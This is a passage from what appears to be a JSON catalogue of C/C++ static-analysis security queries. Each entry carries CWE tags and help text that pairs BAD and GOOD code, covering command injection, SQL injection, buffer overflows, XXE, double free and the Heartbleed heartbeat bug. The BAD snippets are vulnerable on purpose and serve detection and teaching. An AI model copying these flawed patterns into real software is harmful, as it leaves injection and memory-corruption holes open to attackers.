[CWE-125](https://cwe.mitre.org/data/definitions/125.html).\n* Common Weakness Enumeration: [CWE-193](https://cwe.mitre.org/data/definitions/193.html).\n* Common Weakness Enumeration: [CWE-787](https://cwe.mitre.org/data/definitions/787.html).\n"
  },
  "cpp/world-writable-file-creation": {
    "name": "File created without restricting permissions",
    "description": "Creating a file that is world-writable can allow an attacker to write to the file.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "precision": "medium",
    "id": "cpp/world-writable-file-creation",
    "tags": [
      "security",
      "external/cwe/cwe-732"
    ],
    "filename": "71e366af-DoNotCreateWorldWritable",
    "language": "cpp",
    "help": "# File created without restricting permissions\nWhen you create a file, take care to give it the most restrictive permissions possible. A typical mistake is to create the file with world-writable permissions. This can allow an attacker to write to the file, which can give them unexpected control over the program.\n\n\n## Recommendation\nFiles should usually be created with write permissions only for the current user. If broader permissions are needed, including the users' group should be sufficient. It is very rare that a file needs to be world-writable, and care should be taken not to make assumptions about the contents of any such file.\n\nOn Unix systems, it is possible for the user who runs the program to restrict file creation permissions using `umask`. However, a program should not assume that the user will set an `umask`, and should still set restrictive permissions by default.\n\n\n## Example\nThis example shows two ways of writing a default configuration file. Software often does this to provide the user with a convenient starting point for defining their own configuration. However, configuration files can also control important aspects of the software's behavior, so it is important that they cannot be controlled by an attacker.\n\nThe first example creates the default configuration file with the usual \"default\" Unix permissions, `0666`. This makes the file world-writable, so that an attacker could write in their own configuration that would be read by the program. The second example uses more restrictive permissions: a combination of the standard Unix constants `S_IWUSR` and `S_IRUSR` which means that only the current user will have read and write access to the file. The third example shows another way to create a file with more restrictive permissions if a `FILE *` stream pointer is required rather than a file descriptor.\n\n\n```c\nvoid write_default_config_bad() {\n\t// BAD - this is world-writable so any user can overwrite the config\n\tint out = creat(OUTFILE, 0666);\n\tif (out < 0) {\n\t\t// handle error\n\t}\n\n\tdprintf(out, \"%s\", DEFAULT_CONFIG);\n\tclose(out);\n}\n\nvoid write_default_config_good() {\n\t// GOOD - this allows only the current user to modify the file\n\tint out = creat(OUTFILE, S_IWUSR | S_IRUSR);\n\tif (out < 0) {\n\t\t// handle error\n\t}\n\n\tdprintf(out, \"%s\", DEFAULT_CONFIG);\n\tclose(out);\n}\n\nvoid write_default_config_good_2() {\n\t// GOOD - this allows only the current user to modify the file\n\tint out = open(OUTFILE, O_WRONLY | O_CREAT, S_IWUSR | S_IRUSR);\n\tif (out < 0) {\n\t\t// handle error\n\t}\n\n\tFILE *fd = fdopen(out, \"w\");\n\tif (fd == NULL) {\n\t\tclose(out);\n\t\t// handle error\n\t}\n\n\tfprintf(fd, \"%s\", DEFAULT_CONFIG);\n\tfclose(fd);\n}\n\n```\n\n## References\n* The CERT Oracle Secure Coding Standard for C: [ FIO06-C. Create files with appropriate access permissions ](https://www.securecoding.cert.org/confluence/display/c/FIO06-C.+Create+files+with+appropriate+access+permissions).\n* Common Weakness Enumeration: [CWE-732](https://cwe.mitre.org/data/definitions/732.html).\n"
  },
  "cpp/insecure-generation-of-filename": {
    "name": "Insecure generation of filenames.",
    "description": "Using a predictable filename when creating a temporary file can lead to an attacker-controlled input.",
    "kind": "problem",
    "id": "cpp/insecure-generation-of-filename",
    "problem.severity": "warning",
    "precision": "medium",
    "tags": [
      "correctness",
      "security",
      "experimental",
      "external/cwe/cwe-377"
    ],
    "filename": "3b0ef42c-InsecureTemporaryFile",
    "language": "cpp",
    "help": "# Insecure generation of filenames.\nWorking with a file, without checking its existence and its rights, as well as working with names that can be predicted, may not be safe. Requires the attention of developers.\n\n\n## Example\nThe following example demonstrates erroneous and corrected work with file.\n\n\n```cpp\n...\n  fp = fopen(\"/tmp/name.tmp\",\"w\"); // BAD\n...\n  char filename = tmpnam(NULL);\n  fp = fopen(filename,\"w\"); // BAD\n...\n\n  strcat (filename, \"/tmp/name.XXXXXX\");\n  fd = mkstemp(filename);\n  if ( fd < 0 ) {\n    return error;\n  }\n  fp = fdopen(fd,\"w\") // GOOD\n...\n\n```\n\n## References\n* CERT C Coding Standard: [CON33-C. Avoid race conditions when using library functions](https://wiki.sei.cmu.edu/confluence/display/c/CON33-C.+Avoid+race+conditions+when+using+library+functions).\n* Common Weakness Enumeration: [CWE-377](https://cwe.mitre.org/data/definitions/377.html).\n"
  },
  "cpp/errors-when-using-bit-operations": {
    "name": "Errors When Using Bit Operations",
    "description": "Unlike the binary operations `||` and `&&`, there is no sequence point after evaluating an operand of a bitwise operation like `|` or `&`. If left-to-right evaluation is expected this may be confusing.",
    "kind": "problem",
    "id": "cpp/errors-when-using-bit-operations",
    "problem.severity": "warning",
    "precision": "medium",
    "tags": [
      "correctness",
      "security",
      "experimental",
      "external/cwe/cwe-691"
    ],
    "filename": "4c75f1a4-InsufficientControlFlowManagementWhenUsingBitOperations",
    "language": "cpp",
    "help": "# Errors When Using Bit Operations\nUsing bitwise operations can be a mistake in some situations. For example, if parameters are evaluated in an expression and the function should be called only upon certain test results. These bitwise operations look suspicious and require developer attention.\n\n\n## Recommendation\nWe recommend that you evaluate the correctness of using the specified bit operations.\n\n\n## Example\nThe following example demonstrates the erroneous and fixed use of bit and logical operations.\n\n\n```c\nif(len>0 & memset(buf,0,len)) return 1; // BAD: `memset` will be called regardless of the value of the `len` variable. moreover, one cannot be sure that it will happen after verification\n...\nif(len>0 && memset(buf,0,len)) return 1; // GOOD: `memset` will be called after the `len` variable has been checked.\n...\n\n```\n\n## References\n* CWE Common Weakness Enumeration: [ CWE-691: Insufficient Control Flow Management](https://cwe.mitre.org/data/definitions/691.html).\n* Common Weakness Enumeration: [CWE-691](https://cwe.mitre.org/data/definitions/691.html).\n"
  },
  "cpp/tainted-arithmetic": {
    "name": "User-controlled data in arithmetic expression",
    "description": "Arithmetic operations on user-controlled data that is not validated can cause overflows.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 8.6,
    "precision": "low",
    "id": "cpp/tainted-arithmetic",
    "tags": [
      "security",
      "external/cwe/cwe-190",
      "external/cwe/cwe-191"
    ],
    "filename": "d81e4b10-ArithmeticTainted",
    "language": "cpp",
    "help": "# User-controlled data in arithmetic expression\nPerforming calculations on user-controlled data can result in integer overflows unless the input is validated.\n\nIf the user is free to enter very large numbers, even arithmetic operations that would usually result in a small change in magnitude may result in overflows.\n\n\n## Recommendation\nAlways guard against overflow in arithmetic operations on user-controlled data by doing one of the following:\n\n* Validate the user input.\n* Define a guard on the arithmetic expression, so that the operation is performed only if the result can be known to be less than, or equal to, the maximum value for the type, for example `INT_MAX`.\n* Use a wider type, so that larger input values do not cause overflow.\n\n## Example\nIn this example, a value is read from standard input into an `int`. Because the value is a user-controlled value, it could be extremely large. Performing arithmetic operations on this value could therefore cause an overflow. To avoid this happening, the example shows how to perform a check before performing a multiplication.\n\n\n```c\nint main(int argc, char** argv) {\n\tchar buffer[20];\n\tfgets(buffer, 20, stdin);\n\n\tint num = atoi(buffer);\n\t// BAD: may overflow if input is very large\n\tint scaled = num + 1000;\n\n\t// ...\n\n\tint num2 = atoi(buffer);\n\tint scaled2;\n\t// GOOD: use a guard to prevent overflow\n\tif (num2 < INT_MAX-1000)\n\t\tscaled2 = num2 + 1000;\n\telse\n\t\tscaled2 = INT_MAX;\n}\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-190](https://cwe.mitre.org/data/definitions/190.html).\n* Common Weakness Enumeration: [CWE-191](https://cwe.mitre.org/data/definitions/191.html).\n"
  },
  "cpp/very-likely-overrunning-write": {
    "name": "Likely overrunning write",
    "description": "Buffer write operations that do not control the length of data written may overflow",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 9.3,
    "precision": "high",
    "id": "cpp/very-likely-overrunning-write",
    "tags": [
      "reliability",
      "security",
      "external/cwe/cwe-120",
      "external/cwe/cwe-787",
      "external/cwe/cwe-805"
    ],
    "filename": "43f650fa-VeryLikelyOverrunWrite",
    "language": "cpp",
    "help": "# Likely overrunning write\nThe program performs a buffer copy or write operation with no upper limit on the size of the copy. By analyzing the bounds of the expressions involved, it appears that certain inputs will cause a buffer overflow to occur in this case. In addition to causing program instability, techniques exist which may allow an attacker to use this vulnerability to execute arbitrary code.\n\n\n## Recommendation\nAlways control the length of buffer copy and buffer write operations. `strncpy` should be used over `strcpy`, `snprintf` over `sprintf`, and in other cases 'n-variant' functions should be preferred.\n\n\n## Example\n\n```c\nint sayHello(uint32_t userId)\n{\n\tchar buffer[17];\n\n\tif (userId > 9999) return USER_ID_OUT_OF_BOUNDS;\n\n\t// BAD: this message overflows the buffer if userId >= 1000,\n\t// as no space for the null terminator was accounted for\n\tsprintf(buffer, \"Hello, user %d!\", userId);\n\n\tMessageBox(hWnd, buffer, \"New Message\", MB_OK);\n\t\n\treturn SUCCESS;\n}\n```\nIn this example, the call to `sprintf` writes a message of 14 characters (including the terminating null) plus the length of the string conversion of \\`userId\\` into a buffer with space for just 17 characters. While \\`userId\\` is checked to occupy no more than 4 characters when converted, there is no space in the buffer for the terminating null character if \\`userId &gt;= 1000\\`. In this case, the null character overflows the buffer resulting in undefined behavior.\n\nTo fix this issue these changes should be made:\n\n* Control the size of the buffer by declaring it with a compile time constant.\n* Preferably, replace the call to `sprintf` with `snprintf`, using the defined constant size of the buffer or \\`sizeof(buffer)\\` as maximum length to write. This will prevent the buffer overflow.\n* Increasing the buffer size to account for the full range of \\`userId\\` and the terminating null character.\n\n## References\n* CERT C Coding Standard: [STR31-C. Guarantee that storage for strings has sufficient space for character data and the null terminator](https://www.securecoding.cert.org/confluence/display/c/STR31-C.+Guarantee+that+storage+for+strings+has+sufficient+space+for+character+data+and+the+null+terminator).\n* CERT C++ Coding Standard: [STR50-CPP. Guarantee that storage for strings has sufficient space for character data and the null terminator](https://www.securecoding.cert.org/confluence/display/cplusplus/STR50-CPP.+Guarantee+that+storage+for+strings+has+sufficient+space+for+character+data+and+the+null+terminator).\n* Common Weakness Enumeration: [CWE-120](https://cwe.mitre.org/data/definitions/120.html).\n* Common Weakness Enumeration: [CWE-787](https://cwe.mitre.org/data/definitions/787.html).\n* Common Weakness Enumeration: [CWE-805](https://cwe.mitre.org/data/definitions/805.html).\n"
  },
  "cpp/command-line-injection": {
    "name": "Uncontrolled data used in OS command",
    "description": "Using user-supplied data in an OS command, without neutralizing special elements, can make code vulnerable to command injection.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "high",
    "id": "cpp/command-line-injection",
    "tags": [
      "security",
      "external/cwe/cwe-078",
      "external/cwe/cwe-088"
    ],
    "filename": "9145dba3-ExecTainted",
    "language": "cpp",
    "help": "# Uncontrolled data used in OS command\nThe code passes user input as part of a call to `system` or `popen` without escaping special elements. It generates a command line using `sprintf`, with the user-supplied data directly passed as a formatting argument. This leaves the code vulnerable to attack by command injection.\n\n\n## Recommendation\nUse a library routine to escape characters in the user-supplied string before passing it to a command shell.\n\n\n## Example\nThe following example runs an external command in two ways. The first way uses `sprintf` to build a command directly out of a user-supplied argument. As such, it is vulnerable to command injection. The second way quotes the user-provided value before embedding it in the command; assuming the `encodeShellString` utility is correct, this code should be safe against command injection.\n\n\n```c\nint main(int argc, char** argv) {\n  char *userName = argv[2];\n  \n  {\n    // BAD: a string from the user is injected directly into\n    // a command line.\n    char command1[1000] = {0};\n    sprintf(command1, \"userinfo -v \\\"%s\\\"\", userName);\n    system(command1);\n  }\n\n  {\n    // GOOD: the user string is encoded by a library routine.\n    char userNameQuoted[1000] = {0};\n    encodeShellString(userNameQuoted, 1000, userName); \n    char command2[1000] = {0};\n    sprintf(command2, \"userinfo -v %s\", userNameQuoted);\n    system(command2);\n  }\n}\n\n```\n\n## References\n* CERT C Coding Standard: [STR02-C. Sanitize data passed to complex subsystems](https://www.securecoding.cert.org/confluence/display/c/STR02-C.+Sanitize+data+passed+to+complex+subsystems).\n* OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n* Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).\n"
  },
  "cpp/call-to-function-without-wrapper": {
    "name": "Missed opportunity to call wrapper function",
    "description": "If a wrapper function is defined for a given function, any call to the given function should be via the wrapper function.",
    "kind": "problem",
    "id": "cpp/call-to-function-without-wrapper",
    "problem.severity": "warning",
    "precision": "medium",
    "tags": [
      "correctness",
      "maintainability",
      "security",
      "experimental",
      "external/cwe/cwe-1041"
    ],
    "filename": "ba59875c-FindWrapperFunctions",
    "language": "cpp",
    "help": "# Missed opportunity to call wrapper function\nThe presence of a shell function with additional check indicates the possible risks of the call. Use this check everywhere.\n\n\n## Example\nThe following example demonstrates fallacious and fixed methods of using wrapper functions.\n\n\n```cpp\n...\nint myFclose(FILE * fmy)\n{\n  if(!fclose(fmy)) {\n    fmy = NULL;\n    return 0;\n  }\n  return -1;\n}\n...\n  fe = fopen(\"myFile.txt\", \"wt\"); \n  ...\n  fclose(fe); // BAD\n...\n  fe = fopen(\"myFile.txt\", \"wt\"); \n  ...\n  myFclose(fe); // GOOD\n...\n\n```\n\n## References\n* CERT C Coding Standard: [JNI00-J. Define wrappers around native methods](https://wiki.sei.cmu.edu/confluence/display/java/JNI00-J.+Define+wrappers+around+native+methods).\n* Common Weakness Enumeration: [CWE-1041](https://cwe.mitre.org/data/definitions/1041.html).\n"
  },
  "cpp/openssl-heartbleed": {
    "name": "Use of a version of OpenSSL with Heartbleed",
    "description": "Using an old version of OpenSSL can allow remote attackers to retrieve portions of memory.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "very-high",
    "id": "cpp/openssl-heartbleed",
    "tags": [
      "security",
      "external/cwe/cwe-327",
      "external/cwe/cwe-788"
    ],
    "filename": "e533579b-OpenSslHeartbleed",
    "language": "cpp",
    "help": "# Use of a version of OpenSSL with Heartbleed\nEarlier versions of the popular OpenSSL library suffer from a buffer overflow in its \"heartbeat\" code. Because of the location of the problematic code, this vulnerability is often called \"Heartbleed\".\n\nSoftware that includes a copy of OpenSSL should be sure to use a current version of the library. If it uses an older version, it will be vulnerable to any network site it connects with.\n\n\n## Recommendation\nUpgrade to the latest version of OpenSSL. This problem was fixed in version 1.0.1g.\n\n\n## Example\nThe following code is present in earlier versions of OpenSSL. The `payload` variable is the number of bytes that should be copied from the request back into the response. The call to `memcpy` does this copy. The problem is that `payload` is supplied as part of the remote request, and there is no code that checks the size of it. If the caller supplies a very large value, then the `memcpy` call will copy memory that is outside the request packet.\n\n\n```c\nint\ntls1_process_heartbeat(SSL *s)\n    {\n    unsigned char *p = &s->s3->rrec.data[0], *pl;\n    unsigned short hbtype;\n    unsigned int payload;\n \n    /* ... */\n \n    hbtype = *p++;\n    n2s(p, payload);\n    pl = p;\n \n    /* ... */\n \n    if (hbtype == TLS1_HB_REQUEST)\n            {\n            /* ... */\n            memcpy(bp, pl, payload);  // BAD: overflow here\n            /* ... */\n            }\n \n \n    /* ... */\n \n    }\n\n```\n\n## References\n* Common Vulnerabilities and Exposures: [CVE-2014-0160](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160).\n* OpenSSL News: [OpenSSL Security Advisory \\[07 Apr 2014\\]](https://www.openssl.org/news/secadv_20140407.txt).\n* Common Weakness Enumeration: [CWE-327](https://cwe.mitre.org/data/definitions/327.html).\n* Common Weakness Enumeration: [CWE-788](https://cwe.mitre.org/data/definitions/788.html).\n"
  },
  "cpp/cleartext-storage-buffer": {
    "name": "Cleartext storage of sensitive information in buffer",
    "description": "Storing sensitive information in cleartext can expose it to an attacker.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "medium",
    "id": "cpp/cleartext-storage-buffer",
    "tags": [
      "security",
      "external/cwe/cwe-312"
    ],
    "filename": "8538808f-CleartextBufferWrite",
    "language": "cpp",
    "help": "# Cleartext storage of sensitive information in buffer\nSensitive information that is stored unencrypted is accessible to an attacker who gains access to the storage.\n\n\n## Recommendation\nEnsure that sensitive information is always encrypted before being stored to a file or transmitted over the network. It may be wise to encrypt information before it is put into a buffer that may be readable in memory.\n\nIn general, decrypt sensitive information only at the point where it is necessary for it to be used in cleartext.\n\n\n## Example\nThe following example shows two ways of storing user credentials in a file. In the 'BAD' case, the credentials are simply stored in cleartext. In the 'GOOD' case, the credentials are encrypted before storing them.\n\n\n```c\n#include <sodium.h>\n#include <stdio.h>\n#include <string.h>\n\nvoid writeCredentialsBad(FILE *file, const char *cleartextCredentials) {\n  // BAD: write password to disk in cleartext\n  fputs(cleartextCredentials, file);\n}\n\nint writeCredentialsGood(FILE *file, const char *cleartextCredentials, const unsigned char *key, const unsigned char *nonce) {\n  size_t credentialsLen = strlen(cleartextCredentials);\n  size_t ciphertext_len = crypto_secretbox_MACBYTES + credentialsLen;\n  unsigned char *ciphertext = malloc(ciphertext_len);\n  if (!ciphertext) {\n    logError();\n    return -1;\n  }\n\n  // encrypt the password first\n  if (crypto_secretbox_easy(ciphertext, (const unsigned char *)cleartextCredentials, credentialsLen, nonce, key) != 0) {\n    free(ciphertext);\n    logError();\n    return -1;\n  }\n\n  // GOOD: write encrypted password to disk\n  fwrite(ciphertext, 1, ciphertext_len, file);\n\n  free(ciphertext);\n  return 0;\n}\n\n```\nNote that for the 'GOOD' example to work we need to link against an encryption library (in this case libsodium), initialize it with a call to `sodium_init`, and create the key and nonce with `crypto_secretbox_keygen` and `randombytes_buf` respectively. We also need to store those details securely so they can be used for decryption.\n\n\n## References\n* M. Dowd, J. McDonald and J. Schuhm, *The Art of Software Security Assessment*, 1st Edition, Chapter 2 - 'Common Vulnerabilities of Encryption', p. 43. Addison Wesley, 2006.\n* M. Howard and D. LeBlanc, *Writing Secure Code*, 2nd Edition, Chapter 9 - 'Protecting Secret Data', p. 299. Microsoft, 2002.\n* Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).\n"
  },
  "cpp/linux-kernel-no-check-before-unsafe-put-user": {
    "name": "Linux kernel no check before unsafe_put_user vulnerability detection",
    "description": "unsafe_put_user which is used to write data to user-mode memory is widely used in Linux kernel codebase,  but if there is no security check for user-mode pointer used as parameter of unsafe_put_user, attacker can exploit the issue to obtain root privilege. CVE-2017-5123 is quite a good example for your information.",
    "kind": "problem",
    "id": "cpp/linux-kernel-no-check-before-unsafe-put-user",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-020"
    ],
    "filename": "b78cd8be-NoCheckBeforeUnsafePutUser",
    "language": "cpp"
  },
  "cpp/access-memory-location-after-end-buffer-strlen": {
    "name": "Access Of Memory Location After End Of Buffer",
    "description": "The expression `buffer [strlen (buffer)] = 0` is potentially dangerous, if the variable `buffer` does not have a terminal zero, then access beyond the bounds of the allocated memory is possible, which will lead to undefined behavior. If terminal zero is present, then the specified expression is meaningless.",
    "kind": "problem",
    "id": "cpp/access-memory-location-after-end-buffer-strlen",
    "problem.severity": "warning",
    "precision": "medium",
    "tags": [
      "correctness",
      "security",
      "experimental",
      "external/cwe/cwe-788"
    ],
    "filename": "b34b9182-AccessOfMemoryLocationAfterEndOfBufferUsingStrlen",
    "language": "cpp",
    "help": "# Access Of Memory Location After End Of Buffer\nPotentially dangerous use of the strlen function to calculate the length of a string. The expression `buffer[strlen(buffer)] = 0` is potentially dangerous, if the variable buffer does not have a terminal zero, then access beyond the bounds of the allocated memory is possible, which will lead to undefined behavior. If terminal zero is present, then the specified expression is meaningless.\n\nFalse positives include heavily nested strlen. This situation is unlikely.\n\n\n## Recommendation\nWe recommend using another method for calculating the string length\n\n\n## Example\nThe following example demonstrates an erroneous and corrected use of the strlen function.\n\n\n```c\n// BAD: if buffer does not have a terminal zero, then access outside the allocated memory is possible.\n\nbuffer[strlen(buffer)] = 0;\n\n\n// GOOD: we will eliminate dangerous behavior if we use a different method of calculating the length. \nsize_t len;\n...\nbuffer[len] = 0\n\n```\n\n## References\n* CERT C Coding Standard: [STR32-C. Do not pass a non-null-terminated character sequence to a library function that expects a string](https://wiki.sei.cmu.edu/confluence/display/c/STR32-C.+Do+not+pass+a+non-null-terminated+character+sequence+to+a+library+function+that+expects+a+string).\n* Common Weakness Enumeration: [CWE-788](https://cwe.mitre.org/data/definitions/788.html).\n"
  },
  "cpp/sql-injection": {
    "name": "Uncontrolled data in SQL query",
    "description": "Including user-supplied data in a SQL query without neutralizing special elements can make code vulnerable to SQL Injection.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 8.8,
    "precision": "high",
    "id": "cpp/sql-injection",
    "tags": [
      "security",
      "external/cwe/cwe-089"
    ],
    "filename": "e86cdc30-SqlTainted",
    "language": "cpp",
    "help": "# Uncontrolled data in SQL query\nThe code passes user input as part of a SQL query without escaping special elements. It generates a SQL query using `sprintf`, with the user-supplied data directly passed as an argument to `sprintf`. This leaves the code vulnerable to attack by SQL Injection.\n\n\n## Recommendation\nUse a library routine to escape characters in the user-supplied string before converting it to SQL.\n\n\n## Example\n\n```c\nint main(int argc, char** argv) {\n  char *userName = argv[2];\n  \n  // BAD\n  char query1[1000] = {0};\n  sprintf(query1, \"SELECT UID FROM USERS where name = \\\"%s\\\"\", userName);\n  runSql(query1);\n  \n  // GOOD\n  char userNameSql[1000] = {0};\n  encodeSqlString(userNameSql, 1000, userName); \n  char query2[1000] = {0};\n  sprintf(query2, \"SELECT UID FROM USERS where name = \\\"%s\\\"\", userNameSql);\n  runSql(query2);\n}\n\n```\n\n## References\n* MSDN Library: [SQL Injection](https://docs.microsoft.com/en-us/sql/relational-databases/security/sql-injection).\n* Common Weakness Enumeration: [CWE-89](https://cwe.mitre.org/data/definitions/89.html).\n"
  },
  "cpp/external-entity-expansion": {
    "name": "XML external entity expansion",
    "description": "Parsing user-controlled XML documents and allowing expansion of external entity references may lead to disclosure of confidential data or denial of service.",
    "kind": "path-problem",
    "id": "cpp/external-entity-expansion",
    "problem.severity": "warning",
    "security-severity": 9.1,
    "precision": "high",
    "tags": [
      "security",
      "external/cwe/cwe-611"
    ],
    "filename": "12278d09-XXE",
    "language": "cpp",
    "help": "# XML external entity expansion\nParsing untrusted XML files with a weakly configured XML parser may lead to an XML external entity (XXE) attack. This type of attack uses external entity references to access arbitrary files on a system, carry out denial-of-service (DoS) attacks, or server-side request forgery. Even when the result of parsing is not returned to the user, DoS attacks are still possible and out-of-band data retrieval techniques may allow attackers to steal sensitive data.\n\n\n## Recommendation\nThe easiest way to prevent XXE attacks is to disable external entity handling when parsing untrusted data. How this is done depends on the library being used. Note that some libraries, such as recent versions of `libxml`, disable entity expansion by default, so unless you have explicitly enabled entity expansion, no further action needs to be taken.\n\n\n## Example\nThe following example uses the `Xerces-C++` XML parser to parse a string `data`. If that string is from an untrusted source, this code may be vulnerable to an XXE attack, since the parser is constructed in its default state with `setDisableDefaultEntityResolution` set to `false`:\n\n\n```cpp\n\nXercesDOMParser *parser = new XercesDOMParser();\n\nparser->parse(data); // BAD (parser is not correctly configured, may expand external entity references)\n\n```\nTo guard against XXE attacks, the `setDisableDefaultEntityResolution` option should be set to `true`.\n\n\n```cpp\n\nXercesDOMParser *parser = new XercesDOMParser();\n\nparser->setDisableDefaultEntityResolution(true);\nparser->parse(data);\n\n```\n\n## References\n* OWASP: [XML External Entity (XXE) Processing](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing).\n* OWASP: [XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html).\n* Timothy Morgen: [XML Schema, DTD, and Entity Attacks](https://research.nccgroup.com/2014/05/19/xml-schema-dtd-and-entity-attacks-a-compendium-of-known-techniques/).\n* Timur Yunusov, Alexey Osipov: [XML Out-Of-Band Data Retrieval](https://www.slideshare.net/qqlan/bh-ready-v4).\n* Common Weakness Enumeration: [CWE-611](https://cwe.mitre.org/data/definitions/611.html).\n"
  },
  "cpp/badly-bounded-write": {
    "name": "Badly bounded write",
    "description": "Buffer write operations with a length parameter that does not match the size of the destination buffer may overflow.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 9.3,
    "precision": "high",
    "id": "cpp/badly-bounded-write",
    "tags": [
      "reliability",
      "security",
      "external/cwe/cwe-120",
      "external/cwe/cwe-787",
      "external/cwe/cwe-805"
    ],
    "filename": "43f650fa-BadlyBoundedWrite",
    "language": "cpp",
    "help": "# Badly bounded write\nThe program performs a buffer copy or write operation with an incorrect upper limit on the size of the copy. A sufficiently long input will overflow the target buffer. In addition to causing program instability, techniques exist which may allow an attacker to use this vulnerability to execute arbitrary code.\n\n\n## Recommendation\nUse preprocessor defines to specify the size of buffers, and use the same defines as arguments to `strncpy`, `snprintf` etc. This technique will ensure that buffer sizes are always specified correctly so that no overflow occurs.\n\n\n## Example\n\n```c\nvoid congratulateUser(const char *userName)\n{\n\tchar buffer[80];\n\n\t// BAD: even though snprintf is used, this could overflow the buffer\n\t// because the size specified is too large.\n\tsnprintf(buffer, 256, \"Congratulations, %s!\", userName);\n\n\tMessageBox(hWnd, buffer, \"New Message\", MB_OK);\n}\n```\nIn this example, the developer has used `snprintf` to control the maximum number of characters that can be written to `buffer`. Unfortunately, perhaps due to modifications since the code was first written, a limited buffer overrun can still occur because the size argument to `snprintf` is larger than the actual size of the buffer.\n\nTo fix the problem, either the second argument to `snprintf` should be changed to 80, or the buffer extended to 256 characters. A further improvement is to use a preprocessor define so that the size is only specified in one place, potentially preventing future recurrence of this issue.\n\n\n## References\n* CERT C Coding Standard: [STR31-C. Guarantee that storage for strings has sufficient space for character data and the null terminator](https://www.securecoding.cert.org/confluence/display/c/STR31-C.+Guarantee+that+storage+for+strings+has+sufficient+space+for+character+data+and+the+null+terminator).\n* CERT C++ Coding Standard: [STR50-CPP. Guarantee that storage for strings has sufficient space for character data and the null terminator](https://www.securecoding.cert.org/confluence/display/cplusplus/STR50-CPP.+Guarantee+that+storage+for+strings+has+sufficient+space+for+character+data+and+the+null+terminator).\n* Common Weakness Enumeration: [CWE-120](https://cwe.mitre.org/data/definitions/120.html).\n* Common Weakness Enumeration: [CWE-787](https://cwe.mitre.org/data/definitions/787.html).\n* Common Weakness Enumeration: [CWE-805](https://cwe.mitre.org/data/definitions/805.html).\n"
  },
  "cpp/experimental-double-free": {
    "name": "Errors When Double Free",
    "description": "Freeing a previously allocated resource twice can lead to various vulnerabilities in the program.",
    "kind": "problem",
    "id": "cpp/experimental-double-free",
    "problem.severity": "warning",
    "precision": "medium",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-415"
    ],
    "filename": "0ee13502-DoubleFree",
    "language": "cpp",
    "help": "# Errors When Double Free\nFreeing a previously allocated resource twice can lead to various vulnerabilities in the program.\n\n\n## Recommendation\nWe recommend that you exclude situations of possible double release. For example, use the assignment NULL to a freed variable.\n\n\n## Example\nThe following example demonstrates an erroneous and corrected use of freeing a pointer.\n\n\n```c\n...\n  buf = malloc(intSize);\n...\n  free(buf); \n  buf = NULL;\n  if(buf) free(buf); // GOOD\n...\n\n...\n  buf = malloc(intSize);\n...\n  free(buf); \n  if(buf) free(buf); // BAD: the cleanup function does not zero out the pointer\n...\n\n```\n\n## References\n* CERT C Coding Standard: [MEM30-C. Do not access freed memory](https://wiki.sei.cmu.edu/confluence/display/c/MEM30-C.+Do+not+access+freed+memory).\n* Common Weakness Enumeration: [CWE-415](https://cwe.mitre.org/data/definitions/415.html).\n"
  },
  "cpp/work-with-changing-working-directories": {
    "name": "Find work with changing working directories, with security errors.",
    "description": "Not validating the return value or pinning the directory can be unsafe.",
    "kind": "problem",
    "id": "cpp/work-with-changing-working-directories",
    "problem.severity": "warning",
    "precision": "medium",
    "tags": [
      "correctness",
      "security",
      "experimental",
      "external/cwe/cwe-243",
      "external/cwe/cwe-252"
    ],
    "filename": "917adf93-IncorrectChangingWorkingDirectory",
    "language": "cpp",
    "help": "# Find work with changing working directories, with security errors.\nWorking with changing directories, without checking the return value or pinning the directory, may not be safe. Requires the attention of developers.\n\n\n## Example\nThe following example demonstrates erroneous and corrected work with changing working directories.\n\n\n```cpp\n...\n  chroot(\"/myFold/myTmp\"); // BAD\n...\n  chdir(\"/myFold/myTmp\"); // BAD\n...\n  int fd = open(\"/myFold/myTmp\", O_RDONLY | O_DIRECTORY);\n  fchdir(fd); // BAD\n...\n  if (chdir(\"/myFold/myTmp\") == -1) {\n    exit(-1);\n  }\n  if (chroot(\"/myFold/myTmp\") == -1) {  // GOOD\n    exit(-1);\n  }\n...\n  if (chdir(\"/myFold/myTmp\") == -1) { // GOOD\n    exit(-1);\n  }\n...\n  int fd = open(\"/myFold/myTmp\", O_RDONLY | O_DIRECTORY);\n  if(fchdir(fd) == -1) { // GOOD\n    exit(-1);\n  }\n...\n\n```\n\n## References\n* CERT C Coding Standard: [POS05-C. Limit access to files by creating a jail.](https://wiki.sei.cmu.edu/confluence/display/c/POS05-C.+Limit+access+to+files+by+creating+a+jail)\n* Common Weakness Enumeration: [CWE-243](https://cwe.mitre.org/data/definitions/243.html).\n* Common Weakness Enumeration: [CWE-252](https://cwe.mitre.org/data/definitions/252.html).\n"
  },
  "cpp/operator-find-incorrectly-used-exceptions": {
    "name": "Operator Find Incorrectly Used Exceptions",
    "description": "--Finding places for the dangerous use of exceptions.",
    "kind": "problem",
    "id": "cpp/operator-find-incorrectly-used-exceptions",
    "problem.severity": "warning",
    "precision": "medium",
    "tags": [
      "correctness",
      "security",
      "experimental",
      "external/cwe/cwe-703",
      "external/cwe/cwe-248",
      "external/cwe/cwe-390"
    ],
    "filename": "08c0b017-FindIncorrectlyUsedExceptions",
    "language": "cpp",
